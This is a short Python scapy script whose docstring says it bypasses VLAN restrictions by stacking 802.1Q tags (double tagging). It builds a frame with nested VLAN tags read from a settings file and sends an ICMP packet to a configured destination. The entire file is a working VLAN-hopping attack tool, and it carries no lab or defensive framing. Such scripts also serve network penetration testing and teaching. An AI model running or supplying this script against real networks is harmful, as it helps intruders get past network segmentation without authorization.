#!venv/bin/python

from scapy.all import *
from scapy.all import Ether, Dot1Q, IP, ICMP
import settings
"""
Bypass vlan restriction by encapsulation .1q into .1q
"""

dot1_tags = Ether()
for vlan_id in settings.vlans:
    dot1_tags = dot1_tags/Dot1Q(vlan=vlan_id)


pck = dot1_tags/IP(dst=settings.destination_ip)/ICMP()
pck.show()
sendp(pck, iface=settings.source_interface)